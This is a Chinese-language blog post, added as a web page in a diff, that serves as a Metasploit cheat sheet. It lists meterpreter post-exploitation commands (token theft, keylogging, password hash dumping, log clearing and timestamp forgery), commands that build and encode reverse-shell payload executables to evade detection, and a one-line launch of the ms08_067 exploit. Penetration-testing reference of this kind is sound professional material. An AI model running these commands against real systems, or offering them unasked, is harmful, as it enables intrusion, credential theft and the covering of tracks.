@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x01 前言0x02 初始化Metasploit使用PostgreSQL作为数据库，所以先启动postgresql.并初始化数据库然后以root用户打开MSF 0x03 常用命令metasploit命令 help打开meterpreter使用帮助。 run scriptname运行meterpreter脚本，在scripts&#x2F;meterpreter目录下可查看到所有脚本名。 sysinfo列出受">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploit(MSF)初始化及常用命令">
+<meta property="og:url" content="http://swanq.top/2021/04/01/msf/index.html">
+<meta property="og:site_name" content="SwanQ&#39;s blog">
+<meta property="og:description" content="0x01 前言0x02 初始化Metasploit使用PostgreSQL作为数据库，所以先启动postgresql.并初始化数据库然后以root用户打开MSF 0x03 常用命令metasploit命令 help打开meterpreter使用帮助。 run scriptname运行meterpreter脚本，在scripts&#x2F;meterpreter目录下可查看到所有脚本名。 sysinfo列出受">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://swanq.top/2021/04/01/msf/1.jpg">
+<meta property="article:published_time" content="2021-04-01T13:50:29.000Z">
+<meta property="article:modified_time" content="2021-04-01T14:07:36.919Z">
+<meta property="article:author" content="swanQ">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="攻击工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://swanq.top/2021/04/01/msf/1.jpg">
+
+<link rel="canonical" href="http://swanq.top/2021/04/01/msf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>metasploit(MSF)初始化及常用命令 | SwanQ's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">SwanQ's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">有趣的是有道理且新奇，胡思乱想并不有趣。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/swanQs" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/01/msf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          metasploit(MSF)初始化及常用命令
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-01 21:50:29 / 修改时间：22:07:36" itemprop="dateCreated datePublished" datetime="2021-04-01T21:50:29+08:00">2021-04-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><h1 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h1><p>Metasploit使用PostgreSQL作为数据库，所以先启动postgresql.<br>并初始化数据库<br>然后以root用户打开MSF<br><img src="/2021/04/01/msf/1.jpg"></p>
+<h1 id="0x03-常用命令"><a href="#0x03-常用命令" class="headerlink" title="0x03 常用命令"></a>0x03 常用命令</h1><h2 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a>metasploit命令</h2><ul>
+<li>help<br>打开meterpreter使用帮助。</li>
+<li>run scriptname<br>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</li>
+<li>sysinfo<br>列出受控主机的系统信息。</li>
+<li>ls<br>列出目标主机的文件和文件夹信息。</li>
+<li>use priv<br>加载特权提升扩展模块，来扩展metasploit库。</li>
+<li>ps<br>显示所有运行的进程以及相关联的用户账户。</li>
+<li>migrate PID<br>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</li>
+<li>use incognito<br>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</li>
+<li>list_tokens -u<br>列出目标主机用户的可用令牌。</li>
+<li>list_tokens -g<br>列出目标主机用户组的可用令牌。</li>
+<li>impersonate_token DOMAIN_NAME\USERNAME.<br>假冒目标主机上的可用令牌。</li>
+<li>steal_token PID<br>盗窃给定进程的可用令牌并进行令牌假冒。</li>
+<li>drop_token<br>停止假冒当前令牌。</li>
+<li>getsystem<br>通过各种攻击向量来提升系统用户权限。</li>
+<li>execute -f cmd.exe -i<br>执行cmd.exe命令并进行交互。</li>
+<li>execute -f cmd.exe -i -t<br>以所有可用令牌来执行cmd命令并隐藏该进程。</li>
+<li>rev2self<br>回到控制目标主机的初始用户账户下。</li>
+<li>reg command<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</li>
+<li>setdesktop number<br>切换到另一个用户界面（该功能基于那些用户已登录）。</li>
+<li>screenshot<br>对目标主机的屏幕进行截图。</li>
+<li>upload file<br>向目标主机上传文件。</li>
+<li>download file<br>从目标主机下载文件。</li>
+<li>keyscan_start<br>针对远程目标主机开启键盘记录功能。</li>
+<li>keyscan_dump<br>存储目标主机上捕获的键盘记录。</li>
+<li>keyscan_stop<br>停止针对目标主机的键盘记录。</li>
+<li>getprivs<br>尽可能多的获取目标主机上的特权。</li>
+<li>uictl enable keyboard/mouse<br>接管目标主机的键盘和鼠标。</li>
+<li>background<br>将你当前的metasploit shell转为后台执行。</li>
+<li>hashdump<br>导出目标主机中的口令哈希值。</li>
+<li>use sniffer<br>加载嗅探模式。</li>
+<li>sniffer_interfaces<br>列出目标主机所有开放的网络端口。</li>
+<li>sniffer_dump interfaceID pcapname<br>在目标主机上启动嗅探。</li>
+<li>sniffer_start interfaceID packet-buffer<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</li>
+<li>sniffer_stats interfaceID<br>获取正在实施嗅探网络接口的统计数据。</li>
+<li>sniffer_stop interfaceID<br>停止嗅探。</li>
+<li>add_user username password -h ip<br>在远程目标主机上添加一个用户。</li>
+<li>clearev<br>清楚目标主机上的日志记录。</li>
+<li>timestomp<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</li>
+<li>reboot<br>重启目标主机。</li>
+</ul>
+<h2 id="msfpayload命令"><a href="#msfpayload命令" class="headerlink" title="msfpayload命令"></a>msfpayload命令</h2><ul>
+<li>msfpayload -h<br>msfpayload的帮助信息。</li>
+<li>msfpayload windows/meterpreter/bind_tcp O<br>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</li>
+<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</li>
+<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</li>
+<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</li>
+<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</li>
+</ul>
+<h2 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a>msfencode命令</h2><ul>
+<li>mefencode -h<br>列出msfencode的帮助命令。</li>
+<li>msfencode -l<br>列出所有可用的编码器。</li>
+<li>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>显示编码缓冲区的格式。</li>
+<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</li>
+<li>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>创建一个经过多种编码格式嵌套编码的攻击载荷。</li>
+<li>msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c<br>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C格式输出。</li>
+</ul>
+<h2 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a>MSFcli命令</h2><ul>
+<li>msfcli | grep exploit<br>仅列出渗透攻击模块。</li>
+<li>msfcli | grep exploit/windows,<br>仅列出与windows相关的渗透攻击模块。</li>
+<li>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</li>
+</ul>
+<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
+<li>show exploits<br>列出metasploit框架中的所有渗透攻击模块。</li>
+<li>show payloads<br>列出metasploit框架中的所有攻击载荷。</li>
+<li>show auxiliary<br>列出metasploit框架中的所有辅助攻击载荷。</li>
+<li>search name<br>查找metasploit框架中所有的渗透攻击和其他模块。</li>
+<li>info<br>展示出制定渗透攻击或模块的相关信息。</li>
+<li>use name<br>装载一个渗透攻击或模块。</li>
+<li>LHOST<br>本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>
+<li>RHOST<br>远程主机或是目标主机。</li>
+<li>set function<br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
+<li>setg function<br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
+<li>show options<br>列出某个渗透攻击或模块中所有的配置参数。</li>
+<li>show targets<br>列出渗透攻击所有支持的目标平台。</li>
+<li>set target num<br>指定你所知道的目标的操作系统以及补丁版本类型。</li>
+<li>set payload name<br>指定想要使用的攻击载荷。</li>
+<li>show advanced<br>列出所有高级配置选项。</li>
+<li>set autorunscript migrate -f.<br>在渗透攻击完成后，将自动迁移到另一个进程。</li>
+<li>check<br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>
+<li>exploit<br>执行渗透攻击或模块来攻击目标。</li>
+<li>exploit -j<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>
+<li>exploit -z<br>渗透攻击完成后不与回话进行交互。</li>
+<li>exploit -e encoder<br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>
+<li>exploit -h<br>列出exploit命令的帮助信息。</li>
+<li>sessions -l<br>列出可用的交互会话（在处理多个shell时使用）。</li>
+<li>sessions -l -v<br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>
+<li>sessions -s script<br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>
+<li>sessions -K<br>杀死所有活跃的交互会话。</li>
+<li>sessions -c cmd<br>在所有活跃的metasploit会话上执行一个命令。</li>
+<li>sessions -u sessionID<br>升级一个普通的win32 shell到metasploit shell。</li>
+<li>db_create name<br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>
+<li>db_connect name<br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>
+<li>db_namp<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>
+<li>db_autopwn -h<br>展示出db_autopwn命令的帮助信息。</li>
+<li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
+<li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>swanQ
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://swanq.top/2021/04/01/msf/" title="metasploit(MSF)初始化及常用命令">http://swanq.top/2021/04/01/msf/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+	  <div>
+      
+       <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">你想在文章末尾对读者说的话</div>
+    
+</div>
+      
+      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7/" rel="tag"># 攻击工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/30/redis/" rel="prev" title="redis未授权访问总结">
+      <i class="fa fa-chevron-left"></i> redis未授权访问总结
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">0x02 初始化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">0x03 常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit%E5%91%BD%E4%BB%A4"><span class="nav-number">3.1.</span> <span class="nav-text">metasploit命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfpayload%E5%91%BD%E4%BB%A4"><span class="nav-number">3.2.</span> <span class="nav-text">msfpayload命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfencode%E5%91%BD%E4%BB%A4"><span class="nav-number">3.3.</span> <span class="nav-text">msfencode命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSFcli%E5%91%BD%E4%BB%A4"><span class="nav-number">3.4.</span> <span class="nav-text">MSFcli命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="nav-number">3.5.</span> <span class="nav-text">其他命令</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="swanQ"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">swanQ</p>
+  <div class="site-description" itemprop="description">Try & Enjoy</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    聊天
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/swanQs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;swanQs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">swanQ</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+</html>
